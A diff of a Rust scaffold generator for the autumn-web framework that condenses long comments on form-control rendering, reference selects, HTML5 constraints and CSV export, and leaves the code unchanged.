+                // (#1843). `rich_text_area_*` takes `&str`, so the label borrows.
                 let label =
                     labels.lit_ref(&format!("{snake_name}.field.{name}"), &humanize_label(name));
-                // A non-nullable column takes the `required_*` variant, exactly
-                // like every other generated control — `String` and `TEXT NOT
-                // NULL` both accept `""`, so without it an empty editor would
-                // silently persist a blank body (PR #2157 review).
+                // A non-nullable column takes the `required_*` variant: `TEXT NOT NULL` accepts
+                // `""`, so otherwise an empty editor would persist a blank body.
                 let helper = if f.nullable {
                     "rich_text_area_htmx_with_token_field"
                 } else {
                     "required_rich_text_area_htmx_with_token_field"
                 };
-                // #2227: autumn-web builds the editor's own chrome — the
-                // toolbar, the hint, and the preview heading. Under `--i18n`
-                // the `_with_labels` variant takes it from the bundle instead.
-                // `l_rt_labels` is bound once above the form (see
-                // `render_rich_text_label_binds`), because the chrome reads the
-                // same for every rich-text column.
+                // autumn-web builds the editor chrome (toolbar, hint, preview heading). Under
+                // `--i18n` the `_with_labels` variant takes it from `l_rt_labels`, bound once
+                // above the form since it is the same for every rich-text column (#2227).
                 let (variant, labels_arg) = if labels.enabled() {
                     ("_with_labels", ", &l_rt_labels")
                 } else {
@@ -9177,16 +7762,9 @@ fn render_form_for_helper(
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Number {{ step: Some(\"{step}\".into()) }})"
                 );
             }
-            // Issue #1260 AC4: a blank submission auto-derives the slug on
-            // create (see `create_new_block`'s `slug_derive_block`), so the
-            // control must NOT carry `required`/`aria-required` even though
-            // the column itself is `NOT NULL` — otherwise the browser blocks
-            // submission before that derivation logic ever runs. The derive's
-            // default `FormField.required` is driven by Rust-level
-            // nullability (always `true` here, since a slug field is never
-            // `Option<String>`), so this needs the same `.exclude()` +
-            // `.append()` escape hatch the other schema-specific overrides
-            // use, minus the `required_builders` those emit.
+            // A blank slug is derived on create (#1260), so the control must not be `required`
+            // even though the column is `NOT NULL`, or the browser blocks the submit. The derive
+            // marks it required (a slug is never `Option`), hence the `.exclude()` + `.append()`.
             FieldKind::Slug => {
                 let label =
                     labels.lit(&format!("{snake_name}.field.{name}"), &humanize_label(name));
@@ -9214,14 +7792,10 @@ fn render_form_for_helper(
                 );
             }
             FieldKind::References => {
-                // The derive sees a plain `i64` column and emits a number
-                // input; the reference renders as a select over the
-                // referenced table's ids instead. A blank first option gives
-                // required selects browser-native "please select" behavior
-                // (nullable references use it to unset the value). When the
-                // referenced model is missing from the project the select's
-                // option loader could not compile (no schema entry to query),
-                // so the column keeps the derived number input.
+                // Render a select over the referenced table's ids instead of the derived number
+                // input. The blank first option gives required selects native "please select"
+                // behavior and lets nullable ones unset. If the referenced model is missing, the
+                // option loader could not compile, so keep the number input.
                 if missing_reference_targets.contains(name) {
                     continue;
                 }
@@ -9247,17 +7821,9 @@ fn render_form_for_helper(
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Select {{ options: {name}_select }})"
                 );
             }
-            // A nullable `bool` renders as a tri-state `<select>` so `NULL` stays
-            // reachable, and the derive fills it with hardcoded `— Unset —`, `Yes`,
-            // and `No` (`autumn-macros/src/model.rs`'s `form_control_tokens`).
-            // Those are user-facing strings this flag is supposed to have claimed:
-            // without the override they survive untranslated in every create and
-            // edit form, next to a field label that is translated. The same
-            // `override_field` escape hatch the enum arm uses replaces them, keeping
-            // the derive's `""`, `"true"`, and `"false"` values so form parsing is
-            // unaffected. Only under `--i18n`: with the flag off the derived control
-            // is already right, and an override would change output the rest of this
-            // module keeps byte-identical.
+            // The derive renders a nullable `bool` as a tri-state select with hardcoded English
+            // option labels. Under `--i18n`, override it with translated labels, keeping the
+            // `""`/`"true"`/`"false"` values so form parsing is unaffected.
             FieldKind::Bool if f.nullable && labels.enabled() => {
                 let mut options = format!(
                     "(\"\".into(), {}.into())",
@@ -9277,18 +7843,8 @@ fn render_form_for_helper(
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Select {{ options: vec![{options}] }})"
                 );
             }
-            // A `String`/`Text`/numeric field carrying DSL constraint
-            // modifiers (issue #1388) needs HTML5 attributes the derived
-            // `FieldControl` can't express (`minlength`/`maxlength`,
-            // `min`/`max`, `type="email"`/`type="url"`). Exclude it from the
-            // derived render and append an equivalent control that carries the
-            // constraints — the same `.exclude()` + `.append()` escape hatch
-            // the attachment arm uses. The value is re-filled from the
-            // changeset so the 422 re-render keeps entered input, and the
-            // inline-error/ARIA skeleton matches the derived controls.
-            // Issue #3405: a `phone` or `color` column is a `String` with its
-            // own native control. A `time` column needs no override: the
-            // derive maps `NaiveTime` to `FieldControl::Time`.
+            // A `phone` or `color` column is a `String` with its own native control (#3405). A
+            // `time` column needs none: the derive maps `NaiveTime` to `FieldControl::Time`.
             _ if f.constraints.widget.is_some() => {
                 if let Some(widget) = f.constraints.widget {
                     let _ = write!(
@@ -9298,32 +7854,19 @@ fn render_form_for_helper(
                     );
                 }
             }
+            // A field with DSL constraints (#1388) needs HTML5 attributes the derived control
+            // cannot express (`minlength`, `max`, `type="email"`, ...), so it is replaced with an
+            // equivalent control. The value is re-filled from the changeset for the 422 re-render.
             _ => {
                 if let Some((input_type, _)) = html5_constraint_spec(f) {
                     let label =
                         labels.lit(&format!("{snake_name}.field.{name}"), &humanize_label(name));
                     let _ = write!(builder_calls, "\n        .exclude(\"{name}\")");
                     if matches!(f.kind, FieldKind::Text) && input_type == "text" {
-                        // A `text` DSL column with a length or plain constraint is
-                        // a long-form field (Postgres `TEXT`), so its control is a
-                        // `<textarea>`, the element the derived
-                        // `FieldControl::Textarea` would pick. A
-                        // `text{email}`/`text{url}` field has `input_type` `email`
-                        // or `url`, which a textarea cannot carry, so those
-                        // single-line controls take the `<input type="…">` branch
-                        // below.
-                        //
-                        // The constrained multi-line `<textarea>` routes through the
-                        // typed accessible `a11y::TextArea` primitive (#1933):
-                        // rendered element, attributes, and values carry over
-                        // unchanged — the label now carries `autumn-field__label` —
-                        // and only TextArea's attribute order differs. Only the
-                        // attributes a textarea honours apply: the length rules from
-                        // `html5_constraint_builder_calls` and `required`, while the
-                        // input-only `type`, `min`, and `max` are dropped. The 422
-                        // re-render value is the element's text content, not a
-                        // `value=` attribute, so entered input survives, matching
-                        // `form::textarea_input`.
+                        // A constrained `text` column is long-form, so it gets a `<textarea>`
+                        // (`a11y::TextArea`, #1933). `text{email}`/`text{url}` need an input
+                        // type, so they take the `<input>` branch below. A textarea honours only
+                        // the length rules and `required`; `type`, `min` and `max` are dropped.
                         let constraint_builders = html5_constraint_builder_calls(f)
                             .map(|(_, calls)| calls)
                             .unwrap_or_default();
@@ -9354,13 +7897,7 @@ fn render_form_for_helper(
                              }})"
                         );
                     } else {
-                        // Route the constrained single-line `<input>` through the
-                        // typed accessible `a11y::TextField` primitive (#1706): the
-                        // rendered element/attributes/values are unchanged (label now
-                        // carries `autumn-field__label`), only TextField's attribute
-                        // order differs. The wrapper `<div>` and inline-error `<div>`
-                        // stay raw. Constraint attrs become typed builder calls from
-                        // the same `html5_constraint_parts` source as the raw form.
+                        // A single-line `<input>` via `a11y::TextField` (#1706).
                         let constraint_builders = html5_constraint_builder_calls(f)
                             .map(|(_, calls)| calls)
                             .unwrap_or_default();
@@ -9396,18 +7933,11 @@ fn render_form_for_helper(
             }
         }
     }
-    // #2227: one set of chrome bindings for every rich-text column in the form.
-    // This is appended after the per-field loop, so it always sits last in
-    // `preludes`. That keeps the emitted order stable.
+    // One set of rich-text chrome bindings for the whole form (#2227), last in `preludes`.
     preludes.push_str(&render_rich_text_label_binds(fields, labels));
-    // Issue #1326: a `:states(…)` state-machine column is transition-only. The
-    // create form keeps it (initial state), but the EDIT form must not offer it
-    // as an editable input — status changes flow only through the dedicated
-    // `POST /{plural}/{{id}}/transitions/{field}` route. The helper is shared by
-    // both forms, so it takes an `exclude_state_fields` flag: the edit call
-    // passes `true` and the create call `false`. A model with no state-machine
-    // field emits neither the parameter nor the block, keeping the pre-#1326
-    // helper byte-identical.
+    // A state-machine column changes only through its transition route (#1326). The create form
+    // keeps it (initial state); the edit form passes `exclude_state_fields = true` to drop it.
+    // Without state-machine fields neither the parameter nor the block is emitted.
     let sm_field_names: Vec<&str> = fields
         .iter()
         .filter(|f| f.state_machine.is_some())
@@ -9421,54 +7951,36 @@ fn render_form_for_helper(
         for name in &sm_field_names {
             let _ = write!(excludes, "\n        form = form.exclude(\"{name}\");");
         }
-        // Ends at a newline, not at the next line's indent: the template
-        // supplies that. (Before #1323 the trailing indent stacked with the
-        // template's, pushing the following comment out to 8 spaces.)
+        // Ends at a newline, not an indent: the template supplies the next line's indent.
         format!("\n    if exclude_state_fields {{{excludes}\n    }}\n")
     };
-    // Issue #1318: the optimistic-locking version travels as a hidden field
-    // INSIDE the form, so it must be injected here rather than around the
-    // helper's call — `form_for` renders the whole `<form>` element. The edit
-    // call passes `Some(version)` and the create call `None`: a row that does
-    // not exist yet has no version to guard against. A model with no
-    // `lock_version` column emits neither the parameter nor the block, keeping
-    // the pre-#1318 helper byte-identical.
+    // The optimistic-locking version is a hidden field inside the `<form>` that `form_for`
+    // renders, so it is injected here (#1318). The edit call passes `Some(version)`, the create
+    // call `None`.
     let lock_version_block = lock_version_ty.map_or_else(String::new, |ty| {
         let _ = write!(extra_params, ",\n    lock_version: Option<{ty}>");
-        // Prepended AFTER the submit token above, so the token stays the very
-        // first field in the URL-encoded body: `prepend` pushes onto a list
-        // rendered in call order, and `SubmitTokenLayer` only scans the body's
-        // first chunk (issue #1360).
+        // Prepended after the submit token, which must stay the first field: `prepend` renders
+        // in call order, and `SubmitTokenLayer` scans only the body's first chunk (#1360).
         "    if let Some(version) = lock_version {\n        \
          form = form.prepend(html! { input type=\"hidden\" name=\"lock_version\" value=(version); });\n    \
          }\n    "
             .to_owned()
     });
-    // #1323: the nested inline create form must not offer the parent foreign key as an
-    // editable control — the parent is the URL, and the nested create handler sets the
-    // column from the path either way. The helper is shared by the flat create and edit
-    // forms, which keep the belongs_to select from #1146, and the nested form, so it takes
-    // a flag: the nested call passes `true`, every other call `false`. A scaffold with no
-    // `--belongs-to` emits neither the parameter nor the block. Placed after the
-    // state-machine exclusion and before the submit-token prepend, so both exclusions read
-    // together and neither disturbs the token's position at the front of the form (#1360).
+    // The nested create form takes its parent from the URL, so it drops the parent FK control
+    // (#1323): the nested call passes `exclude_parent_fk = true`, the flat forms `false`.
     let parent_fk_block = parent_fk.map_or_else(String::new, |name| {
         let _ = write!(extra_params, ",\n    exclude_parent_fk: bool");
         format!("    if exclude_parent_fk {{\n        form = form.exclude(\"{name}\");\n    }}\n")
     });
-    // Issue #1349: the helper renders every labeled control, so with `--i18n` it
-    // takes the request's locale. By value for the same reason `show_view` does:
-    // `t!` expands to `Locale::t(&locale, …)`, which a `&Locale` binding would
-    // turn into a `&&Locale`.
+    // Under `--i18n` the helper takes the locale by value (#1349): `t!` expands to
+    // `Locale::t(&locale, …)`, which a `&Locale` binding would turn into `&&Locale`.
     let form_for_locale_param = if labels.enabled() {
         "locale: Locale,\n    "
     } else {
         ""
     };
-    // Relabel every control the `FormModel` derive renders. The derive humanizes
-    // the column name into Title Case; `.override_label` swaps in the `t!`
-    // lookup for the SAME key the index header and show row use, so one
-    // translation serves all three surfaces.
+    // Relabel each derived control with the same key the index header and show row use, so one
+    // translation serves all three.
     if labels.enabled() {
         for f in fields {
             let name = &f.name;
@@ -9540,14 +8052,12 @@ fn render_reference_option_loaders(
             continue;
         };
         match reference_displays.get(name) {
-            // A display column was resolved (issue #1146): load `(id, label)`
-            // pairs so the `<select>` shows a human-friendly value, not the
-            // raw id. A nullable display column coalesces to the id string.
+            // Load `(id, label)` pairs so the `<select>` shows a readable label, not the raw id
+            // (#1146).
             Some(display) => {
                 let column = &display.column;
-                // A blank label gives an option with no accessible name, and
-                // trips the `SelectOption::new` debug assert (#2666): use the
-                // id instead.
+                // A blank label leaves the option with no accessible name and trips the
+                // `SelectOption::new` debug assert (#2666), so use the id.
                 let (load_ty, label_expr) = if display.column_nullable {
                     (
                         "Option<String>",
@@ -9574,8 +8084,8 @@ fn render_reference_option_loaders(
                      }}\n\n"
                 );
             }
-            // No string column to display (or the target model couldn't be
-            // parsed): fall back to the id as both value and label.
+            // No string column to display, or the target model couldn't be parsed: the id is
+            // both value and label.
             None => {
                 let _ = write!(
                     out,
@@ -9656,8 +8166,6 @@ fn resolve_reference_display(
     let base = field.name.strip_suffix("_id").unwrap_or(&field.name);
     let is_self_ref = field.reference_table().as_deref() == Some(self_plural);
     let columns = target_string_columns(project_root, field, self_plural, own_fields);
-    // The `name`/`title`/first-string-column heuristic, reused both when no
-    // explicit label is given and when an explicit one has to be discarded.
     let heuristic = || {
         columns
             .iter()
@@ -9668,31 +8176,21 @@ fn resolve_reference_display(
     };
     let (column, column_nullable) = if let Some(label) = &field.constraints.label {
         if let Some((c, n)) = columns.iter().find(|(c, _)| c == label) {
-            // Explicit override names a real string column on the target — use
-            // it, with its known nullability.
             (c.clone(), *n)
         } else if !is_self_ref
             && field
                 .reference_table()
                 .is_some_and(|table| !super::model::model_file_exists(project_root, &table, base))
         {
-            // The target model genuinely isn't discoverable (not yet generated,
-            // unparseable, or a single-file `models.rs` layout we can't read),
-            // so the override can't be validated. Honor it as before (assume a
-            // non-null `String`), matching the "assume the table exists" posture
-            // the missing-target path takes. Not reachable on the normal select
-            // path (missing targets are excluded upstream), but keeps the
-            // resolver correct for any other caller. A self-reference IS
-            // discoverable (via `own_fields`), so it never takes this branch.
+            // The target model isn't discoverable (not yet generated, unparseable, or a
+            // single-file `models.rs`), so the label can't be validated: trust it as a non-null
+            // `String`. The select path excludes missing targets, so only other callers reach
+            // this. A self-reference is always discoverable through `own_fields`.
             (label.clone(), false)
         } else {
-            // The model IS discoverable but `{label}` names no string column —
-            // a typo, a non-string column, or a model with NO string columns at
-            // all (e.g. `Post { id, count: i32 }` + `{label:count}`). Emitting
-            // `select {table}::{label}` (loaded as `String`) would fail to
-            // compile the generated app, so fall back to the heuristic display
-            // column: generation still succeeds, and the plan carries a warning
-            // (emitted in `execute`) telling the author the label was ignored.
+            // The model is discoverable but `{label}` names no string column. Selecting it as a
+            // `String` would not compile in the generated app, so fall back to the heuristic;
+            // `execute` warns that the label was ignored.
             heuristic()?
         }
     } else {
@@ -9734,30 +8232,23 @@ fn render_changeset_form_inputs(
 ) -> String {
     use std::fmt::Write as _;
     let cv = changeset_var;
-    // The reference fields that render an in-form `<select>` (issue #1750): the
-    // present, non-missing `references` columns whose runtime option loader the
-    // handler threads into scope. A missing-target reference has no loader, so
-    // it keeps the derived per-field control instead.
+    // References that render an in-form `<select>` (#1750). A missing-target reference has no
+    // option loader, so it keeps the derived control.
     let reference_select_names: BTreeSet<&str> =
         reference_selects.iter().map(|f| f.name.as_str()).collect();
     let mut out = String::with_capacity(fields.len() * 150);
     for f in fields {
         let name = &f.name;
         let label = humanize_label(name);
-        // A DSL-constrained field (issue #1388) carries HTML5 attributes the
-        // shipped `autumn_web::form` helpers can't express; render it as raw
-        // markup instead so the live path matches the standard path (#1750).
+        // A DSL-constrained field (#1388) carries HTML5 attributes the `autumn_web::form` helpers
+        // can't express, so it renders as raw markup, matching the standard path (#1750).
         let constraint = html5_constraint_spec(f);
         let line = if f.kind.is_rich_text() {
-            // Issue #1255: identical control to the standard `form_for` path —
-            // the Markdown editor with its htmx live preview. A rich-text
-            // column never takes the inline-*validation* htmx path: its wrapper
-            // already owns an `hx-post` (the preview), and a second one would
-            // fight it for the same element.
+            // The same Markdown editor with htmx live preview as the standard path (#1255). No
+            // inline-validation htmx: the wrapper's `hx-post` already drives the preview.
             //
-            // `.as_ref()` because the handler owns an `Option<SubmitFormField>`
-            // here (the `form_for` helper takes an `Option<&…>` instead) — two
-            // rich-text columns in one form would otherwise use a moved value.
+            // `.as_ref()` because the handler owns an `Option<SubmitFormField>`; two rich-text
+            // columns would otherwise use a moved value.
             let helper = if f.nullable {
                 "rich_text_area_htmx_with_token_field"
             } else {
@@ -9769,8 +8260,7 @@ fn render_changeset_form_inputs(
                  submit_field.as_ref().map_or(\"_submit_token\", |f| f.0.as_str())))"
             )
         } else if f.kind.is_reference() && reference_select_names.contains(name.as_str()) {
-            // belongs_to parent dropdown (issue #1146), restored in the
-            // `--live-validation` per-field path (issue #1750).
+            // belongs_to parent dropdown (#1146, #1750).
             render_live_reference_select(f, cv)
         } else if let (true, Some((input_type, _attrs))) = (
             matches!(
@@ -9779,29 +8269,17 @@ fn render_changeset_form_inputs(
             ),
             &constraint,
         ) {
-            // A constrained numeric renders a number input carrying its
-            // `min`/`max` (and `step="any"` for floats). Numerics don't take the
-            // htmx inline-validation path, so no `validate_url`.
+            // Numerics don't take the htmx inline-validation path, so no `validate_url`.
             render_live_constrained_field(f, cv, input_type, None)
         } else if f.kind.is_attachment() {
-            // #1236: a plain file input, no hidden key. The enclosing `<form>`
-            // carries `enctype="multipart/form-data"` so the browser uploads the
-            // file with no JavaScript, and an edit that does not re-upload
-            // preserves the current attachment server-side, since the handler
-            // binds `streamed.or(current)`. A file input cannot be repopulated —
-            // browser security. #1951 routes it through the typed accessible
-            // `a11y::FileField` primitive, so the input carries a
-            // programmatically-associated `<label for>`; the previous raw `label
-            // { … } input;` had an unassociated label. No htmx wiring —
-            // attachments never take the inline-validation path.
+            // A plain file input (#1236). The form is `multipart/form-data`. A file input cannot be
+            // repopulated, so an edit that does not re-upload keeps the current attachment because
+            // the handler binds `streamed.or(current)`. Attachments never take the inline-validation
+            // path.
             format!("(autumn_web::a11y::FileField::new(\"{name}\").label(\"{label}\"))")
         } else {
-            // A required (non-nullable) field uses the framework's
-            // `required_*` sibling helper — `required` + `aria-required="true"`
-            // — matching the pre-#1124 generator's unconditional `required`
-            // attribute on every non-nullable input. Nullable fields get the
-            // plain helper: leaving them blank is valid, so no browser-native
-            // "please fill out this field" prompt should block submission.
+            // Non-nullable fields use the `required_*` helpers (`required` +
+            // `aria-required="true"`); a nullable field may be left blank.
             match (f.kind, f.nullable) {
                 (FieldKind::Bool, false) => {
                     format!("(autumn_web::form::checkbox_input(&{cv}, \"{name}\", \"{label}\"))")
@@ -9824,9 +8302,8 @@ fn render_changeset_form_inputs(
                 (FieldKind::F32 | FieldKind::F64, true) => format!(
                     "(autumn_web::form::number_input(&{cv}, \"{name}\", \"{label}\", Some(\"any\")))"
                 ),
-                // `step` matches the column's declared scale, so the browser's
-                // stepper (and its "please match the requested format"
-                // validation) aligns with what the SQL column actually stores.
+                // `step` matches the column's scale, so browser validation agrees with what the
+                // SQL column stores.
                 (FieldKind::Decimal { scale, .. }, false) => format!(
                     "(autumn_web::form::required_number_input(&{cv}, \"{name}\", \"{label}\", Some(\"{step}\")))",
                     step = decimal_step(scale)
@@ -9861,13 +8338,8 @@ fn render_changeset_form_inputs(
                         }
                     }
                 }
-                // Issue #1341: a real `<textarea>`, not the derived control's
-                // single-line text input fallback. There is no
-                // `required_textarea_input` helper (textarea has never had a
-                // required variant, unlike text/number/datetime/select), so
-                // both nullable and non-nullable route through the same call
-                // — the server-side JSON parse in `into_new` still 400s a
-                // blank required field.
+                // A real `<textarea>` (#1341). There is no required textarea helper, so both
+                // nullabilities share one call; `into_new`'s JSON parse still 400s a blank value.
                 (FieldKind::Json, _) => {
                     format!("(autumn_web::form::textarea_input(&{cv}, \"{name}\", \"{label}\"))")
                 }
@@ -9892,29 +8364,16 @@ fn render_changeset_form_inputs(
                     )
                 }
                 _ => {
-                    // String / Text / Uuid / references fall through to a text
-                    // input. `--live-validation` on a validated text field wires
-                    // the htmx inline-validation variant (no-JS falls back to the
-                    // full-form 422 re-render, which works for every kind); a
-                    // non-nullable field keeps the `required`/`aria-required`
-                    // signal via `required_text_input_htmx` so a validator rule
-                    // that happens to permit an empty string (e.g. a max-only
-                    // `length` rule) doesn't leave a blank required field with
-                    // no client-side guard at all.
+                    // String / Text / Uuid / references render a text input. A validated field
+                    // under `--live-validation` gets the htmx variant; a non-nullable one keeps
+                    // `required` so a rule that permits "" (a max-only `length`) still has a
+                    // client-side guard.
                     let validated_htmx = live_validation && validated.contains(&name.as_str());
                     if let Some((input_type, _attrs)) = &constraint {
-                        // #1750: a DSL-constrained `String`/`Text` field carries
-                        // the #1388 client-side HTML5 attributes —
-                        // `minlength`/`maxlength`, `type="email"`/`url`, and a
-                        // `<textarea>` for long-form `Text` — that the shipped
-                        // helpers cannot express. Route it through the typed a11y
-                        // primitives mirroring the standard `form_for` path
-                        // (#1951), threading the htmx inline-validation wiring on
-                        // via `.hx()` when the field is validated, so real-time
-                        // validation keeps working alongside the static
-                        // constraints. A constrained field always has a validator
-                        // rule, so this is the validated path; the `validate_url`
-                        // is threaded only when `live_validation`.
+                        // A DSL-constrained `String`/`Text` field (#1750) carries the #1388
+                        // HTML5 attributes the helpers cannot express, so it uses the typed a11y
+                        // primitives like the standard path (#1951), with htmx wiring through
+                        // `.hx()` under live validation.
                         let validate_url =
                             validated_htmx.then(|| format!("paths::validate_{name}()"));
                         render_live_constrained_field(f, cv, input_type, validate_url.as_deref())
@@ -10059,16 +8518,9 @@ fn html5_constraint_parts(field: &Field) -> Option<(&'static str, Vec<Html5Const
             if let Some(max) = &c.max {
                 parts.push(Html5Constraint::Max(max.clone()));
             }
-            // A constrained float must keep `step="any"` — the same step the
-            // unconstrained float control (`FieldControl::Number { step: "any" }`)
-            // emits. Without it browsers default a `type="number"` input to
-            // `step="1"` and reject fractional input like `0.5` for
-            // `ratio:f64{min=0,max=1}` client-side, even though the server-side
-            // `range` validator and the `f64` type accept it (issue #1388's
-            // "client and server agree"). Only emitted when the field is
-            // actually constrained (min/max present, so `parts` is non-empty);
-            // otherwise the early-return below keeps the field in the derived
-            // render rather than needlessly excising it.
+            // Keep `step="any"` like the unconstrained float control: without it browsers
+            // default to `step="1"` and reject `0.5`, which the server accepts (#1388). Only when
+            // constrained, so an unconstrained float stays in the derived render.
             if !parts.is_empty() {
                 parts.push(Html5Constraint::StepAny);
             }
@@ -10076,9 +8528,8 @@ fn html5_constraint_parts(field: &Field) -> Option<(&'static str, Vec<Html5Const
         }
         _ => return None,
     };
-    // Nothing to add over the derived control: a plain `text`/`number` with no
-    // constraint attributes is exactly what `form_for` already renders, so
-    // don't excise-and-reappend it (which would only reorder the field).
+    // A plain `text`/`number` with no constraint attributes is what `form_for` already
+    // renders; excising and re-appending it would only reorder the field.
     if parts.is_empty() && input_type != "email" && input_type != "url" {
         return None;
     }
@@ -10136,17 +8587,13 @@ fn render_live_constrained_field(
     field: &Field,
     changeset_var: &str,
     input_type: &str,
-    // A Rust expression (as source text) producing the inline-validation URL —
-    // the typed path helper `paths::validate_{field}()` (issue #1133). Spliced
-    // into `.hx("post", …)` so the URL has a single source of truth.
+    // Rust source for the inline-validation URL, e.g. `paths::validate_{field}()` (#1133).
     validate_url: Option<&str>,
 ) -> String {
     let name = &field.name;
     let label = humanize_label(name);
     let cv = changeset_var;
-    // Typed HTML5-constraint builder calls (`.minlength(3u32)`, `.min("0")`,
-    // `.step("any")`, …) from the same `html5_constraint_parts` source the
-    // standard `form_for` input path uses, so the two paths can't drift.
+    // Built from the same source as the standard `form_for` path, so the two can't drift.
     let constraint_builders = html5_constraint_builder_calls(field)
         .map(|(_, calls)| calls)
         .unwrap_or_default();
@@ -10155,15 +8602,11 @@ fn render_live_constrained_field(
     } else {
         ".required().aria_required()"
     };
-    // A constrained `Text` column is long-form (Postgres `TEXT`), so it renders
-    // a `<textarea>` (matching the derived `FieldControl::Textarea` and the
-    // standard path). A `text{email}`/`text{url}` field is inherently
-    // single-line (its `input_type` is `email`/`url`), so it takes the `<input>`
-    // branch — a textarea can't carry those types.
+    // A constrained `Text` column renders a `<textarea>`, like the derived control. A
+    // `text{email}`/`text{url}` field keeps an `<input>`: a textarea can't carry those types.
     let is_textarea = matches!(field.kind, FieldKind::Text) && input_type == "text";
-    // htmx inline-validation wiring: the swap-target marker stays a raw
-    // attribute on the wrapper `<div>`, while the control carries the htmx
-    // attributes through the primitive's `.hx()` escape hatch (issue #1951).
+    // The swap-target marker is a raw attribute on the wrapper `<div>`; the control carries the
+    // htmx attributes through `.hx()` (#1951).
     let (wrapper_marker, hx_builders) = validate_url.map_or_else(
         || (String::new(), String::new()),
         |url| {
@@ -10275,7 +8718,7 @@ fn render_live_reference_select(field: &Field, changeset_var: &str) -> String {
 fn cell_value_expr(field: &Field) -> String {
     let name = &field.name;
     match (field.nullable, field.kind) {
-        // Attachment: always Option<Blob>; show presence only, no Blob internals.
+        // Always `Option<Blob>`: show presence only.
         (_, FieldKind::Attachment) => {
             format!("if row.{name}.is_some() {{ \"attachment\" }} else {{ \"—\" }}")
         }
@@ -10284,29 +8727,21 @@ fn cell_value_expr(field: &Field) -> String {
                 "row.{name}.as_ref().map(|v| String::from_utf8_lossy(v).to_string()).unwrap_or_default()"
             )
         }
-        // Nullable String/Text: use as_deref to avoid heap allocation.
-        // `RichText` joins them: an index cell renders the Markdown SOURCE as
-        // escaped text (maud's `Render` impl escapes it), never rendered
-        // markup — a table cell has no business carrying block-level HTML, and
-        // escaped source is inherently safe. The rendered form lives on the
-        // show page (see `render_show_property_rows`).
+        // `RichText` shows its escaped Markdown source here; the rendered form is on the show
+        // page.
         (true, FieldKind::String | FieldKind::Text | FieldKind::RichText) => {
             format!("row.{name}.as_deref().unwrap_or_default()")
         }
-        // Nullable: Option<T> — no Render impl; unwrap to String.
         (true, _) => format!("row.{name}.as_ref().map(ToString::to_string).unwrap_or_default()"),
-        // Index and show view only. Non-nullable Bytea shows as lossy UTF-8;
-        // `Cow<str>` implements `Render`.
+        // Lossy is fine: the index and show views only display.
         (false, FieldKind::Bytea) => format!("String::from_utf8_lossy(&row.{name})"),
-        // String/Text/RichText: &String implements Render via deref coercion.
         (false, FieldKind::String | FieldKind::Text | FieldKind::RichText) => {
             format!("&row.{name}")
         }
-        // Numerics (i32, i64, f32, f64): implement Render directly.
         (false, FieldKind::I32 | FieldKind::I64 | FieldKind::F32 | FieldKind::F64) => {
             format!("row.{name}")
         }
-        // Bool, Uuid, chrono types: no Render impl in maud 0.27; convert via Display.
+        // Bool, Uuid and chrono types have no maud `Render` impl; go through `Display`.
         (false, _) => format!("row.{name}.to_string()"),
     }
 }
@@ -10330,30 +8765,23 @@ fn cell_value_expr(field: &Field) -> String {
 fn csv_value_expr(field: &Field) -> String {
     let name = &field.name;
     let raw = match (field.nullable, field.kind) {
-        // Attachment is always `Option<Blob>`. `Blob` has no `Display`, and the
-        // index's "attachment"/"—" presence marker is useless in a spreadsheet —
-        // export the store KEY, the one value that finds the file again.
+        // `Blob` has no `Display`. Export the store key, the one value that finds the file again.
         (_, FieldKind::Attachment) => {
             format!("self.{name}.as_ref().map(|blob| blob.key.clone()).unwrap_or_default()")
         }
-        // `Vec<u8>` has no `Display` either. `\x` + hex loses no byte and imports
-        // back unchanged (issue #2330). The index and show views stay lossy
-        // because they only display.
+        // `\x` + hex loses no byte and imports back unchanged (#2330).
         (true, FieldKind::Bytea) => {
             format!("self.{name}.as_deref().map(bytea_to_hex).unwrap_or_default()")
         }
         (false, FieldKind::Bytea) => format!("bytea_to_hex(&self.{name})"),
-        // Already a `String`: clone rather than round-trip through `Display`.
-        // `Enum` is excluded — its Rust type is the generated enum, not a
-        // `String` (see `Field::rust_type`) — and so falls to the arms below.
+        // `Enum` is excluded: its Rust type is the generated enum, not a `String`.
         (true, FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Slug) => {
             format!("self.{name}.clone().unwrap_or_default()")
         }
         (false, FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Slug) => {
             format!("self.{name}.clone()")
         }
-        // Every remaining kind is `Display` (numerics, bool, Uuid, chrono,
-        // Decimal, the generated enums, and `references` foreign keys).
+        // Every remaining kind implements `Display`.
         (true, _) => format!("self.{name}.as_ref().map(ToString::to_string).unwrap_or_default()"),
         (false, _) => format!("self.{name}.to_string()"),
     };
@@ -10503,16 +8931,8 @@ const CSV_TEXT_CELL_HELPER: &str = "\n\n\
 /// export, and a column that is always blank is noise in a spreadsheet.
 fn render_csv_schema_impl(pascal_name: &str, fields: &[Field]) -> String {
     use std::fmt::Write as _;
-    // Issue #1340: an at-rest encrypted column is excluded from the export. The
-    // model holds PLAINTEXT in memory, so including it would stream the
-    // decrypted secret of every listed row into a file that then lives outside
-    // the app entirely — a downloaded `.csv` in a Downloads folder, an email
-    // attachment, a shared drive. That is the one place the "plaintext in Rust,
-    // ciphertext at rest" bargain stops holding, and it is exactly why
-    // `autumn-admin-plugin`'s own `AdminModel::csv_export_columns` already
-    // filters `!f.encrypted`. The scaffolded export matches that posture rather
-    // than contradicting the admin for the same column. Re-add the column here
-    // (plus a matching `to_csv_record` entry) if the export genuinely needs it.
+    // Encrypted columns are left out (#1340): the model holds plaintext, and an export file
+    // lives outside the app. `AdminModel::csv_export_columns` filters them the same way.
     let exported: Vec<&Field> = fields.iter().filter(|f| !f.is_encrypted()).collect();
     let mut headers = String::from("\"id\"");
     let mut record = String::from("            self.id.to_string(),\n");
@@ -10522,9 +8942,8 @@ fn render_csv_schema_impl(pascal_name: &str, fields: &[Field]) -> String {
     }
     headers.push_str(", \"created_at\"");
     record.push_str("            self.created_at.to_string(),\n");
-    // The formula guard is emitted only when some column actually routes through
-    // it — an unused `fn` in the generated app is a `dead_code` warning, and the
-    // scaffold's contract is that generated code compiles warning-free.
+    // Emit the formula guard only when a column uses it: an unused `fn` is a `dead_code`
+    // warning in the generated app.
     let text_cell_helper = if exported.iter().any(|f| csv_kind_is_text(f.kind)) {
         CSV_TEXT_CELL_HELPER
     } else {
@@ -11300,39 +9719,24 @@ fn render_csv_import_section(
     flash_arg: &str,
     authz_params: &str,
     authz_call: &str,
